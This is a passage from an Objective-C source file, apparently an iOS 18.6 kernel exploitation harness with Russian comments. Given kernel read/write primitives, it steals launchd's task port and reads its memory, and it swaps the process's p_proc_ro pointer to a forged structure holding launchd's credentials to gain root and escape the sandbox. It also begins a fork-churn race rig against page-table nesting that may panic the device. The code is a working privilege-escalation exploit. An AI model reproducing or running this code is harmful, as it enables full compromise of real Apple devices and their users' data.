        kwritebuf(ioSlot, &origIoBits, sizeof(origIoBits));
        kwritebuf(kobjSlot, &origKobjRaw, sizeof(origKobjRaw));
        goto e10fail;
    }
    didSteal = YES;

    // 7. Userspace verification THROUGH the stolen port: pid_for_task must
    //    answer 1, mach_vm_region must enumerate launchd's map, mach_vm_read
    //    must return launchd's bytes. Всё это до кражи падало (см. контроль).
    krAfter = pid_for_task(stolen, &gotPid);
    kpNote(r, [NSString stringWithFormat:@"  pid_for_task ПОСЛЕ: %s, pid=%d (ждём KERN_SUCCESS и 1)",
              mach_error_string(krAfter), (int)gotPid]);
    pidOK = (krAfter == KERN_SUCCESS && gotPid == 1);

    if (!pidOK) {
        // Порт НЕ признан task port → mach_vm_region/read на нём — это и был
        // kernel data abort (ребуты #3/#4, far=мусор+0x18). НЕ ходим.
        // Вместо этого диффим первые 0x60 байт подменённого порта против
        // настоящего task port — лог покажет, какого поля не хватает ядру.
        [r appendString:@"  порт НЕ признан task port — mach_vm_region/read ПРОПУЩЕНЫ (там паника). Дифф портов:\n"];
        memset(portHdr, 0, sizeof(portHdr));
        if (kpRead(ourPortVA, portHdr, sizeof(portHdr), "stolen port hdr", r)) {
            kpNote(r, @"  наш порт (подменённый), первые 0x60:");
            kpAppendHexDump(r, ourPortVA, portHdr, sizeof(portHdr));
        }
        kpNote(r, @"  настоящий task port (шаблон), первые 0x60:");
        kpAppendHexDump(r, selfTaskPortObj, realHdr, sizeof(realHdr));
    }
    else {
        memset(&regInfo, 0, sizeof(regInfo));
        krReg = mach_vm_region(stolen, &raddr, &rsize, VM_REGION_BASIC_INFO_64,
                               (vm_region_info_t)&regInfo, &icnt, &objName);
        kpNote(r, [NSString stringWithFormat:@"  mach_vm_region(launchd): %s → base=0x%016llx size=0x%llx",
                  mach_error_string(krReg), (uint64_t)raddr, (uint64_t)rsize]);
        regionOK = (krReg == KERN_SUCCESS);

        if (regionOK && rsize) {
            want = rsize < 0x100 ? rsize : 0x100;
            krRd = mach_vm_read(stolen, raddr, want, &dataOut, &dataCnt);
            if (krRd == KERN_SUCCESS && dataCnt) {
                readOK = YES;
                kpNote(r, [NSString stringWithFormat:@"  mach_vm_read: %u байт из launchd @ 0x%016llx — чужая память читается:",
                          dataCnt, (uint64_t)raddr]);
                kpAppendHexDump(r, raddr, (const void *)dataOut, dataCnt > 0x40 ? 0x40 : dataCnt);
                mach_vm_deallocate(mach_task_self(), dataOut, dataCnt);
            }
            else {
                kpNote(r, [NSString stringWithFormat:@"  mach_vm_read: %s", mach_error_string(krRd)]);
            }
        }
    }

    // 8. Restore BEFORE teardown, in reverse order. A task-kotype port with a
    //    foreign kobject reaching ipc_port_dealloc drops a task reference
    //    nobody took — launchd task refcount underflow → паника на выходе.
    if (didSteal) {
        kwritebuf(ioSlot, &origIoBits, sizeof(origIoBits));
        kwritebuf(kobjSlot, &origKobjRaw, sizeof(origKobjRaw));
        kpRead(ioSlot, &rb32, sizeof(rb32), "io_bits restore readback", r);
        kpRead(kobjSlot, &rb64, sizeof(rb64), "ip_kobject restore readback", r);
        restored = (rb32 == origIoBits) && (rb64 == origKobjRaw);
        kpNote(r, [NSString stringWithFormat:@"  restore: io_bits=0x%08x (ждём 0x%08x) · ip_kobject=0x%016llx (ждём 0x%016llx) — %@",
                  rb32, origIoBits, (unsigned long long)rb64, (unsigned long long)origKobjRaw,
                  restored ? @"OK" : @"НЕ СОШЛОСЬ"]);
    }
    if (restored || !didSteal) {
        mach_port_destroy(mach_task_self(), stolen);
        kpNote(r, @"  порт уничтожен (mach_port_destroy после restore)");
    }
    else {
        // Destroying now would panic at dealloc; leaving it panics at process
        // exit. Either way — say it loudly and keep the session alive.
        [r appendString:@"КРИТИЧНО: restore не подтверждён — порт оставлен подменённым, НЕ уничтожай приложение до ребута!\n"];
    }

    if (pidOK && regionOK && readOK) {
        [r appendString:@"\n=== E10 PASS: ESCAPE — наш порт отвечает как task port launchd (pid 1, unsandboxed root) ===\n"];
        [r appendString:@"Записано было только в наш собственный ipc_port (RW heap); launchd task не писался, подмена восстановлена. Постоянный вариант = полный контроль launchd: mach_vm_write в root-процесс, task_threads → нити, без единой записи в KPP/KTRR/RO-память.\n"];
    }
    else if (didSteal) {
        if (!pidOK) {
            [r appendFormat:@"\n=== E10 FAIL: порт не признан task port (pid_for_task: %s, pid=%d) — vm_* пропущены, подмена откачена, паники не было. Дифф портов выше ===\n",
                mach_error_string(krAfter), (int)gotPid];
        }
        else {
            [r appendFormat:@"\n=== E10 FAIL: подмена прилипла, но верификация не полная (pid_for_task: %s pid=%d · vm_region: %s · vm_read: %s) ===\n",
                mach_error_string(krAfter), (int)gotPid,
                regionOK ? "ok" : mach_error_string(krReg),
                readOK ? "ok" : (regionOK ? mach_error_string(krRd) : "n/a (region не открылся)")];
        }
    }
    else {
        [r appendString:@"\n=== E10 FAIL: см. лог выше ===\n"];
    }
    return r;

e10fail:
    if (stolen != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), stolen);
    return r;
}

#pragma mark - E11: proc_ro-swap → root + unsandbox (heap pointer swap)

// E11 replaces the dead EXP-09 ucred-swap (proc_ro is RO-zone on 18.6 — the
// 1.9.2 in-place patch proved field writes never land) and the E10 port
// retype. Instead of patching fields INSIDE proc_ro, swap the proc_ro
// POINTER: proc->p_proc_ro (koffsetof(proc, proc_ro)) is a RAW pointer — no
// PAC, device-log confirmed (raw, no tag) — in the proc zone (heap, RW:
// fork writes it). proc_ro itself is never written. The forge is a full
// 0x400 copy of OUR proc_ro in our own wired user page (EXP-09 1.9.3
// physmap path). Overlaid from launchd's proc_ro (read-only): p_ucred ONLY
// (SMR-encoded qword — value-level portable, copied byte-for-byte, never
// decoded/re-encoded) and p_csflags (u32). Device finding (18.6, A17 Pro):
// task_tokens and the filter-mask pointers are PAC-signed with ADDRESS
// diversity — copied verbatim to our forge (different address) they fail
// authentication: "PAC failure from kernel with DA key while authing x16"
// at verify. They stay OURS in the forge. Everything else (pr_task
// included) stays ours too. Kernel writes: 8 bytes at proc->p_proc_ro,
// nothing else. Restore right after verify is MANDATORY: the forged proc_ro
// points at launchd's ucred without a reference, so exit/exec while swapped
// drops a ref nobody took → ucred underflow → panic (same shape as E10's
// port).
+ (NSString *)procRoSwapReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== E11: proc_ro-swap → root+unsandbox (подмена указателя p_proc_ro, RO-зона не трогается) ===\n"];
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }

    // Все локалы наверху: между подменой и restore нет ни ARC-объектов, ни
    // ранних return — выход только через хвост метода.
    pid_t selfPid = getpid();
    uint64_t selfProc = 0, procRoRaw = 0, procRo = 0;
    uint64_t launchdProc = 0, launchdRoRaw = 0, launchdRo = 0;
    uint64_t task = 0, map = 0, pmap = 0, ttep = 0;
    uint64_t pa = 0, forgeKVA = 0, rbRaw = 0, origProcRoRaw = 0, procRoSlot = 0;
    uint64_t probeQ = 0, launchdUcredVA = 0;
    uint8_t *page = NULL;
    uid_t newUid = (uid_t)-1;
    gid_t newGid = (gid_t)-1;
    BOOL didSwap = NO, stuck = NO, restored = NO, uidRoot = NO, unsandboxOK = NO;
    char commBuf[33];
    uint8_t selfRo[0x400], ldRo[0x400];

    // proc_ro-лестница. На 18.6 (Darwin 24.6, ветка «18.4+» в shim info.c —
    // сдвиг +0x8 от p_orig_ppid, тот же ход, что в Dopamine info.c): ожидаем
    // proc.proc_ro=0x18 · ucred=0x28 · csflags=0x24 · syscall_filter=0x30 ·
    // task_tokens=0x48 · mach_trap_filter=0x70 · mach_kobj_filter=0x78 ·
    // t_flags_ro=0x80. (База Dopamine: ucred=0x20/csflags=0x1C — до сдвига.)
    uint32_t offProcRo   = koffsetof(proc, proc_ro);
    uint32_t offUcred    = koffsetof(proc_ro, ucred);
    uint32_t offCsflags  = koffsetof(proc_ro, csflags);
    uint32_t offSfMask   = koffsetof(proc_ro, syscall_filter_mask);
    uint32_t offMtMask   = koffsetof(proc_ro, mach_trap_filter_mask);
    uint32_t offMkMask   = koffsetof(proc_ro, mach_kobj_filter_mask);
    uint32_t offTokens   = koffsetof(proc_ro, task_tokens);
    uint32_t offTflagsRo = koffsetof(proc_ro, t_flags_ro);
    kpNote(r, [NSString stringWithFormat:@"  лестница: proc.proc_ro=+0x%x · proc_ro: ucred=+0x%x csflags=+0x%x syscall_filter=+0x%x task_tokens=+0x%x mach_trap_filter=+0x%x mach_kobj_filter=+0x%x t_flags_ro=+0x%x (exists=%d)",
              offProcRo, offUcred, offCsflags, offSfMask, offTokens,
              offMtMask, offMkMask, offTflagsRo, (int)koffsetof(proc_ro, exists)]);
    if (!koffsetof(proc_ro, exists)) {
        [r appendString:@"FAIL: proc_ro не существует на этом билде по gSystemInfo\n"];
        return r;
    }
    if (!offProcRo || !offUcred) {
        [r appendString:@"FAIL: proc.proc_ro / proc_ro.ucred не резолвятся — без них подмена невозможна, стоп (без паники)\n"];
        return r;
    }
    // Копируемые поля должны помещаться в окно 0x400. Копируются ТОЛЬКО
    // p_ucred и p_csflags — task_tokens и filter-mask указатели PAC-подписаны
    // с адресной привязкой (device-находка: перенос в форж по другому адресу =
    // PAC failure DA key при аутентификации → паника), они остаются нашими.
    if (offUcred + 8 > 0x400 || (offCsflags && offCsflags + 4 > 0x400)) {
        [r appendString:@"FAIL: поле proc_ro за пределами окна 0x400 — лестница расходится с билдом, стоп\n"];
        return r;
    }

    // 1. Свой proc и текущий proc_ro. proc_self() напрямую (оффсет-цепь, без
    //    обхода allproc — обход был источником паник), fast walk — fallback.
    kpNote(r, [NSString stringWithFormat:@"  наш pid: %d", selfPid]);
    selfProc = proc_self();
    kpNote(r, [NSString stringWithFormat:@"  наш proc (proc_self): 0x%016llx", (unsigned long long)selfProc]);
    if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)selfPid log:r];
    if (!selfProc) selfProc = [self findSelfProcByComm:r];
    if (!selfProc) {
        [r appendString:@"FAIL: свой proc не найден\n"];
        return r;
    }

    procRoSlot = selfProc + offProcRo;
    if (!kpRead(procRoSlot, &procRoRaw, sizeof(procRoRaw), "proc.p_proc_ro", r)) {
        [r appendString:@"FAIL: proc.p_proc_ro не прочитан\n"];
        return r;
    }
    origProcRoRaw = procRoRaw;
    procRo = kp_untag_ptr(procRoRaw);
    kpNote(r, [NSString stringWithFormat:@"  p_proc_ro: raw=0x%016llx → 0x%016llx%@",
              (unsigned long long)procRoRaw, (unsigned long long)procRo,
              procRoRaw == procRo ? @" (сырой, без PAC-тега — как в device-логах)" : @" (был тег — untag применён)"]);
    if (!kpLooksLikeKernelPointer(procRo)) {
        [r appendString:@"FAIL: proc_ro не kernel-указатель\n"];
        return r;
    }

    // Наш proc_ro целиком (RO-зона — ТОЛЬКО ЧИТАЕМ) — основа форжа.
    memset(selfRo, 0, sizeof(selfRo));
    if (!kpRead(procRo, selfRo, sizeof(selfRo), "наш proc_ro (0x400)", r)) {
        [r appendString:@"FAIL: свой proc_ro не прочитан\n"];
        return r;
    }

    // 2. launchd (pid 1) — ТОЛЬКО fast pid-walk (дисциплина E10: опасные
    //    fallback'и отключены намеренно). launchd и его proc_ro читаются,
    //    но НИКОГДА не пишутся.
    launchdProc = [self findSelfProcByPidFast:1 log:r];
    if (!launchdProc) {
        [r appendString:@"FAIL: launchd (pid 1) не найден fast walk'ом — счётчик узлов в логе выше\n"];
        return r;
    }
    memset(commBuf, 0, sizeof(commBuf));
    if (kpRead(launchdProc + off_proc_p_name, commBuf, 32, "launchd comm", r)) {
        kpNote(r, [NSString stringWithFormat:@"  comm pid 1: \"%s\" (ждём launchd)", commBuf]);
        if (strncmp(commBuf, "launchd", 7) != 0) {
            kpNote(r, @"  ВНИМАНИЕ: comm не launchd — pid-оффсет под вопросом, продолжаю (решает верификация)");
        }
    }
    if (!kpRead(launchdProc + offProcRo, &launchdRoRaw, sizeof(launchdRoRaw), "launchd proc.p_proc_ro", r)) {
        [r appendString:@"FAIL: launchd p_proc_ro не прочитан\n"];
        return r;
    }
    launchdRo = kp_untag_ptr(launchdRoRaw);
    kpNote(r, [NSString stringWithFormat:@"  launchd proc_ro: raw=0x%016llx → 0x%016llx",
              (unsigned long long)launchdRoRaw, (unsigned long long)launchdRo]);
    if (!kpLooksLikeKernelPointer(launchdRo)) {
        [r appendString:@"FAIL: launchd proc_ro не kernel-указатель\n"];
        return r;
    }
    // Тот же рубеж, что в E10: дальше каждое чтение идёт по вычисленному
    // адресу — требуем вооружённый unmapped-гейт kpRead, иначе стоп.
    if (!gCpuTtepVA && !gCpuTtepPhys) {
        [r appendString:@"FAIL: translation-гейт не поднят (gCpuTtepVA/gCpuTtepPhys == 0) — чтения по launchd-цепочке пошли бы безгейтово, стоп до паники\n"];
        return r;
    }
    memset(ldRo, 0, sizeof(ldRo));
    if (!kpRead(launchdRo, ldRo, sizeof(ldRo), "launchd proc_ro (0x400)", r)) {
        [r appendString:@"FAIL: launchd proc_ro не прочитан\n"];
        return r;
    }

    // Диагностика launchd p_ucred: SMR-декод (kpSMRDecode из E10 — формула
    // обратима, тег SMR, не PAC: untag только ПОСЛЕ декода) → VA → cr_uid.
    // В форж qword попадает ДОСЛОВНО — декод здесь только валидация для лога.
    {
        uint64_t ldUcredRaw = 0, dec = 0;
        memcpy(&ldUcredRaw, ldRo + offUcred, sizeof(ldUcredRaw));
        dec = kpSMRDecode(ldUcredRaw);
        launchdUcredVA = kp_untag_ptr(dec);
        kpNote(r, [NSString stringWithFormat:@"  launchd p_ucred (SMR): raw=0x%016llx → decode=0x%016llx → VA=0x%016llx",
                  (unsigned long long)ldUcredRaw, (unsigned long long)dec, (unsigned long long)launchdUcredVA]);
        if (kpLooksLikeKernelPointer(launchdUcredVA)) {
            uint32_t uid = 0xFFFFFFFF;
            if (kpRead(launchdUcredVA + 0x18, &uid, sizeof(uid), "launchd ucred.cr_uid", r)) {
                kpNote(r, [NSString stringWithFormat:@"  launchd ucred.cr_uid = %u (ждём 0)%@", uid,
                          uid == 0 ? @"" : @" — НЕ root?! qword всё равно копируется дословно"]);
            }
        }
        else {
            kpNote(r, @"  ВНИМАНИЕ: SMR-декод launchd ucred не дал kernel VA — копия всё равно дословная (value-level переносим)");
        }
    }

    // 3. Форж в нашей wired-странице — physmap-путь EXP-09 1.9.3 дословно:
    //    posix_memalign(0x4000) + запись + mlock → vtophys по НАШЕМУ pmap →
    //    phystokv → kernel VA. Страница НИКОГДА не освобождается — форж живёт
    //    в ней (как pipe-буфер EXP-09 / wired-страница 1.9.3).
    if (posix_memalign((void **)&page, 0x4000, 0x4000) != 0 || !page) {
        [r appendString:@"FAIL: posix_memalign\n"];
        return r;
    }
    memset(page, 0, 0x4000);
    // База форжа — НАШ proc_ro целиком: pr_task и все прочие поля остаются
    // нашими. Поверх — ТОЛЬКО p_ucred и p_csflags от launchd.
    memcpy(page, selfRo, sizeof(selfRo));
    if (mlock(page, 0x4000) != 0) {
        kpNote(r, [NSString stringWithFormat:@"  mlock: %s — продолжаю (страница свежая, не выгрузится сразу)", strerror(errno)]);
    }
    {
        uint64_t qSelf = 0, qLd = 0;
        // p_ucred: SMR qword дословно (8 байт) — не декодируем/не перекодируем.
        // SMR — value-level (тег кодирует значение, не адрес), переносимо.
        memcpy(&qSelf, selfRo + offUcred, 8);
        memcpy(&qLd, ldRo + offUcred, 8);
        memcpy(page + offUcred, ldRo + offUcred, 8);
        kpNote(r, [NSString stringWithFormat:@"  форж: p_ucred @+0x%x: наш raw=0x%016llx → launchd raw=0x%016llx (дословно)",
                  offUcred, (unsigned long long)qSelf, (unsigned long long)qLd]);
        if (offCsflags) {
            uint32_t fSelf = 0, fLd = 0;
            memcpy(&fSelf, selfRo + offCsflags, 4);
            memcpy(&fLd, ldRo + offCsflags, 4);
            memcpy(page + offCsflags, ldRo + offCsflags, 4);
            kpNote(r, [NSString stringWithFormat:@"  форж: p_csflags @+0x%x: наш=0x%08x → launchd=0x%08x",
                      offCsflags, fSelf, fLd]);
        }
        else {
            kpNote(r, @"  форж: proc_ro.csflags не резолвится — оставлен наш (TODO: захардкодить 0x24 для 18.4+)");
        }
        // task_tokens / syscall_filter_mask / mach_trap_filter_mask /
        // mach_kobj_filter_mask от launchd НЕ копируются — device-находка
        // (18.6, A17 Pro): они PAC-подписаны с АДРЕСНОЙ привязкой к proc_ro
        // launchd. Дословный перенос в наш форж (другой адрес) давал
        // «PAC failure from kernel with DA key while authing x16» на verify →
        // ребут. В форже эти поля остаются НАШИМИ (из копии нашего proc_ro).
        kpNote(r, @"  форж: task_tokens и filter masks — НАШИ (launchd'овские PAC-signed, address-bound → не переносимы)");
    }

    // Цепь к нашему pmap по НАШЕМУ proc_ro (до подмены):
    // proc_ro -> pr_task -> task.map -> vm_map.pmap -> pmap.ttep
    if (!kpRead(procRo + off_proc_ro_pr_task, &task, sizeof(task), "proc_ro.pr_task", r)) return r;
    task = kp_untag_ptr(task);
    if (!kpLooksLikeKernelPointer(task)) { [r appendString:@"FAIL: task\n"]; return r; }
    if (!kpRead(task + off_task_map, &map, sizeof(map), "task.map", r)) return r;
    map = kp_untag_ptr(map);
    if (!kpLooksLikeKernelPointer(map)) { [r appendString:@"FAIL: map\n"]; return r; }
    if (!kpRead(map + koffsetof(vm_map, pmap), &pmap, sizeof(pmap), "vm_map.pmap", r)) return r;
    pmap = kp_untag_ptr(pmap);
    if (!kpLooksLikeKernelPointer(pmap)) { [r appendString:@"FAIL: pmap\n"]; return r; }
    if (!kpRead(pmap + koffsetof(pmap, ttep), &ttep, sizeof(ttep), "pmap.ttep", r)) return r;
    ttep = kp_untag_ptr(ttep);
    kpNote(r, [NSString stringWithFormat:@"  цепь: task=%#llx map=%#llx pmap=%#llx ttep=%#llx",
              (unsigned long long)task, (unsigned long long)map,
              (unsigned long long)pmap, (unsigned long long)ttep]);

    // PA нашей страницы через НАШ pmap, затем kernel VA через настоящий
    // ptov_table (phystokv) — на A17 physmap НЕ линеен от physBase (1.9.4).
    pa = vtophys(ttep, (uint64_t)page);
    if (!pa) {
        [r appendString:@"FAIL: vtophys нашей страницы = 0 (не замаплена?)\n"];
        return r;
    }
    forgeKVA = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
    kpNote(r, [NSString stringWithFormat:@"  страница: userVA=%#llx pa=%#llx → kernel VA (ptov)=%#llx",
              (unsigned long long)page, (unsigned long long)pa, (unsigned long long)forgeKVA]);
    if (!kpLooksLikeKernelPointer(forgeKVA)) {
        uint64_t lin = kconstant(virtBase) + (pa - kconstant(physBase));
        kpNote(r, [NSString stringWithFormat:@"  ptov дал 0 — линейная оценка: %#llx", (unsigned long long)lin]);
        [r appendString:@"FAIL: phystokv не дал kernel VA для страницы\n"];
        return r;
    }

    // Sanity: читаем форж обратно ПО kernel VA — qword[0] совпадает с нашим
    // proc_ro[0] (форж начинается с нашей копии).
    if (kpRead(forgeKVA, &probeQ, sizeof(probeQ), "forge readback", r)) {
        uint64_t selfQ = 0;
        memcpy(&selfQ, selfRo, 8);
        kpNote(r, [NSString stringWithFormat:@"  чтение форжа по kernel VA: %#llx (наш proc_ro[0]=%#llx — %s)",
                  (unsigned long long)probeQ, (unsigned long long)selfQ,
                  probeQ == selfQ ? "совпал" : "РАЗЛИЧАЕТСЯ?!"]);
    }

    // Предфильтр записи (дисциплина EXP-09): цель — наш proc (proc-зона) —
    // обязана быть heap-типа. proc_ro (RO-зона) НЕ пишется — тип только в лог.
    if (gFrameTableVA) {
        int tProc = -1, tRo = -1;
        uint64_t fpa = kvtophys(selfProc);
        if (fpa) tProc = kpFrameTypeOfPALogged(gFrameTableVA, fpa, r);
        fpa = kvtophys(procRo);
        if (fpa) tRo = kpFrameTypeOfPALogged(gFrameTableVA, fpa, r);
        kpNote(r, [NSString stringWithFormat:@"  типы фреймов: proc=%@ proc_ro=%@ (heap=0x%02x)",
                  tProc < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tProc],
                  tRo < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tRo],
                  gHeapFrameType]);
        if (gHeapTypeKnown && tProc >= 0 && tProc != gHeapFrameType) {
            [r appendString:@"FAIL: наш proc НЕ heap-типа (RO-зона?!) — запись отменена до паники\n"];
            return r;
        }
    }
    else {
        [r appendString:@"  оракул типов недоступен — продолжаю без предфильтра (proc пишется форком → обычная зона)\n"];
    }

    // 4. Подмена: одна 8-байтная heap-запись в НАШ proc. Поле сырое (без
    //    PAC) — пишем канонический kernel VA форжа как есть. Оригинал —
    //    дословный raw qword — сохранён выше для restore.
    kpNote(r, [NSString stringWithFormat:@"  подмена: p_proc_ro @ 0x%016llx ← 0x%016llx (форж; оригинал raw=0x%016llx сохранён)",
              (unsigned long long)procRoSlot, (unsigned long long)forgeKVA, (unsigned long long)origProcRoRaw]);
    kwritebuf(procRoSlot, &forgeKVA, sizeof(forgeKVA));
    didSwap = YES;
    rbRaw = 0;
    kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro readback", r);
    kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
              (unsigned long long)rbRaw, (unsigned long long)forgeKVA]);
    stuck = (rbRaw == forgeKVA);

    if (stuck) {
        // 5. Verify: getuid() перечитывает proc_ro->p_ucred на каждый вызов
        //    (доказано EXP-09) — с форжем это ucred launchd. Проба на
        //    unsandbox — запись в /private/var/root.
        newUid = getuid();
        newGid = getgid();
        uidRoot = (newUid == 0);
        kpNote(r, [NSString stringWithFormat:@"  после подмены: getuid()=%d getgid()=%d%@",
                  newUid, newGid, uidRoot ? @" ← ROOT" : @""]);

        const char *probePath = "/private/var/root/kexproof-e11-probe.txt";
        errno = 0;
        FILE *f = fopen(probePath, "w");
        if (f) {
            fputs("kexproof e11\n", f);
            fclose(f);
            unlink(probePath);
            unsandboxOK = YES;
            [r appendString:@"  /private/var/root: запись УДАЛАСЬ — sandbox не держит (ucred+label launchd)\n"];
        }
        else {
            kpNote(r, [NSString stringWithFormat:@"  /private/var/root: %s — %@", strerror(errno),
                      uidRoot ? @"uid root, но sandbox/MAC ещё действует (label кеширован?)" : @"uid не root"]);
        }
    }
    else {
        [r appendString:@"FAIL: подмена не прилипла — kwrite по proc-зоне не работает\n"];
    }

    // 6. RESTORE — обязателен, немедленно после verify, до любого выхода.
    //    Форж ссылается на ucred launchd без взятого рефа: exit/exec/fork-пути
    //    учётки с подменённым proc_ro уронили бы рефкаунт ucred launchd →
    //    паника. Форж-страница wired и НЕ освобождается — restore единственное
    //    условие безопасного выхода. Пишем дословный оригинальный raw qword.
    if (didSwap) {
        kwritebuf(procRoSlot, &origProcRoRaw, sizeof(origProcRoRaw));
        rbRaw = 0;
        kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro restore readback", r);
        restored = (rbRaw == origProcRoRaw);
        kpNote(r, [NSString stringWithFormat:@"  restore: p_proc_ro=0x%016llx (ждём 0x%016llx) — %@",
                  (unsigned long long)rbRaw, (unsigned long long)origProcRoRaw,
                  restored ? @"OK" : @"НЕ СОШЛОСЬ"]);
        if (!restored) {
            [r appendString:@"КРИТИЧНО: restore НЕ подтверждён — proc всё ещё указывает на форж. Страница wired и валидна, но ucred launchd без рефа: НЕ убивай и НЕ перезапускай приложение до ребута (exit = паника)!\n"];
        }
    }

    if (uidRoot && unsandboxOK && restored) {
        [r appendString:@"\n=== E11 PASS: root + unsandbox через proc_ro-swap. Записано: 8 байт в наш proc (heap); launchd и его proc_ro не писались; p_proc_ro восстановлен. ===\n"];
    }
    else if (uidRoot && restored) {
        [r appendString:@"\n=== E11 ЧАСТИЧНО: uid 0 получен, но /private/var/root не открылся — sandbox/MAC держит (label кеширован на task?). Подмена восстановлена, паники не было. ===\n"];
    }
    else if (!restored) {
        [r appendString:@"\n=== E11 FAIL: restore не подтверждён — см. КРИТИЧНО выше ===\n"];
    }
    else if (stuck) {
        [r appendFormat:@"\n=== E11 FAIL: указатель подменялся и восстановлен чисто, но getuid()=%d — creds кешируются не из proc_ro? См. лог ===\n", newUid];
    }
    else {
        [r appendString:@"\n=== E11 FAIL: подмена не прилипла (kwrite по proc-зоне не работает?); слот цел, restore-проверка сошлась — паники не было ===\n"];
    }
    return r;
}

#pragma mark - EXP-13: nest/unnest race rig (may-panic by design)

// The churn primitive: every fork() nests the shared-cache subordinate pmap
// into the child (~192 SPTM nest calls on the shared-cache twigs per fork on
// 18.6), the instant _exit+waitpid tears it back down (unnest, endpoint 11).
// pmap_nest_internal is two SPTM calls (ids 9, 10) with kernel state mutated
// between them — the twig frame's FTE (type/level/owner/rw_guard) is exactly
// the state that can desync mid-sequence.

#define KP_EXP13_CHURN_THREADS 4

struct kpExp13FTE {
    uint16_t rwGuard; // fte+0: ≥2 while the nested mapping is alive
    uint8_t  type;    // fte+2: 0x0b=XNU_DEFAULT · 0x14=leaf · CPU PT={0x08,0x11,0x12,0x1f}
    uint8_t  level;   // fte+4
    uint8_t  owner;   // fte+8: single byte (0xff=unowned) — 1.9.10: was u64
};

struct kpExp13ChurnCtx {
    volatile int stop;           // rig → threads: прекратить churn
    volatile int forkBroken;     // threads → rig: сколько потоков сломались на fork()
    volatile int forkErrno;      // errno первого неудачного fork()
    volatile uint64_t forks;     // успешных fork+waitpid циклов (суммарно, допускает гонку счётчика)
};

static void kpExp13ParseFTE(const uint8_t fte[16], struct kpExp13FTE *out)
{
    memcpy(&out->rwGuard, fte + 0, sizeof(out->rwGuard));
    out->type = fte[2];
    out->level = fte[4];
    memcpy(&out->owner, fte + 8, sizeof(out->owner));
}

static void *kpExp13ChurnMain(void *arg)
{
    struct kpExp13ChurnCtx *ctx = (struct kpExp13ChurnCtx *)arg;
    while (!ctx->stop) {
        pid_t p = fork();
        if (p == 0) _exit(0); // child: nothing but the nest/unnest cycle itself
        if (p > 0) {
            int st = 0;
            waitpid(p, &st, 0);
            ctx->forks++;
        }
        else {
            ctx->forkErrno = errno;
            ctx->forkBroken++;
            break;
        }
    }
    return NULL;
}

// Instrumented page-table walk for EXP-13 bring-up: same logic as
// vtophys_lvl (16K, root L1, PA/VA branch by the top bits of ttep) but logs
// every level's raw TTE so a field run shows exactly where a walk breaks.
static void kpExp13DebugWalk(NSMutableString *r, const char *tag, uint64_t ttep, uint64_t va)
{
    BOOL physical = !(ttep & 0xf000000000000000ULL);
    kpNote(r, [NSString stringWithFormat:@"  debug-walk %s: ttep=0x%016llx (%s) va=0x%016llx",
              tag, (unsigned long long)ttep, physical ? "physical" : "virtual", (unsigned long long)va]);
    uint64_t cur = ttep;
    for (uint64_t lvl = PMAP_TT_L1_LEVEL; lvl <= PMAP_TT_L3_LEVEL; lvl++) {
        struct tt_level *lvlp = &arm_tt_level[lvl];
        uint64_t idx = (va & lvlp->indexMask) >> lvlp->shift;
        uint64_t tteAddr = cur + idx * 8;
        uint64_t entry = physical ? physread64(tteAddr) : kread64(tteAddr);
        BOOL valid = ((entry & lvlp->validMask) == lvlp->validMask);
        BOOL block = ((entry & lvlp->typeMask) == lvlp->typeBlock);
        kpNote(r, [NSString stringWithFormat:@"    L%llu idx=%llu tte@0x%016llx raw=0x%016llx valid=%d type=%s",
                  (unsigned long long)lvl, (unsigned long long)idx,
                  (unsigned long long)tteAddr, (unsigned long long)entry,
                  valid ? 1 : 0, block ? "block" : "table"]);
        if (!valid) {
            kpNote(r, @"    обрыв: entry невалиден на этом уровне");
            return;
        }
        if (block) {
            uint64_t pa = (entry & ARM_TTE_PA_MASK & ~lvlp->offMask) | (va & lvlp->offMask);
            kpNote(r, [NSString stringWithFormat:@"    block mapping → PA=0x%016llx", (unsigned long long)pa]);
            return;
        }
        cur = entry & ARM_TTE_TABLE_MASK;
        if (!physical) cur = phystokv(cur);
    }
    kpNote(r, [NSString stringWithFormat:@"    конец обхода: последняя таблица=0x%016llx", (unsigned long long)cur]);
}

+ (NSString *)sptmNestRaceReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== EXP-13: nest/unnest race rig (МОЖЕТ ПАНИКОВАТЬ — это нормально) ===\n"];
    if (!gPrimitives.kreadbuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }
    [r appendString:@"Все находки sync-пишутся в kexproof-live.log ДО возможной паники — после ребута смотри live/prev лог.\n"];

    // 1. Chain to our pmap (the EXP-09 1.9.3 ladder):
    //    proc -> proc_ro -> task -> vm_map -> pmap -> ttep
    pid_t selfPid = getpid();
    kpNote(r, [NSString stringWithFormat:@"  наш pid: %d", selfPid]);
    uint64_t selfProc = proc_self();
    kpNote(r, [NSString stringWithFormat:@"  наш proc (proc_self): 0x%016llx", (unsigned long long)selfProc]);
    if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)selfPid log:r];
    if (!selfProc) selfProc = [self findSelfProcByComm:r];
    if (!selfProc) {
        [r appendString:@"FAIL: свой proc не найден\n"];
        return r;
    }

    uint64_t procRoRaw = 0;
    if (!kpRead(selfProc + koffsetof(proc, proc_ro), &procRoRaw, sizeof(procRoRaw), "proc.proc_ro", r)) return r;
    uint64_t procRo = kp_untag_ptr(procRoRaw);
    if (!kpLooksLikeKernelPointer(procRo)) { [r appendString:@"FAIL: proc_ro не kernel-указатель\n"]; return r; }

    uint64_t task = 0, map = 0, pmap = 0, ttep = 0;
    if (!kpRead(procRo + off_proc_ro_pr_task, &task, sizeof(task), "proc_ro.pr_task", r)) return r;
    task = kp_untag_ptr(task);
    if (!kpLooksLikeKernelPointer(task)) { [r appendString:@"FAIL: task\n"]; return r; }
